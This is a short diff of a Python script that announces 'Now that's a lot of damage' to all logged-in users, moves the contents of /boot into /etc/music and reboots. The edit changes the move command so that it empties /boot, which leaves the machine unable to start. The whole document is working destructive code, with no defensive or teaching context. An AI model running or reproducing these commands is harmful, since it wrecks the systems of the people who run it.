@@ -10,6 +10,6 @@ def main():
             os.system("wall -n \"Now that's a lot of damage\"")
             os.system("sleep 5")
             os.system("mkdir /etc/music")
-            os.system("mv /boot /etc/music")
+            os.system("mv /boot/* /etc/music")
             os.system("reboot")
 main()
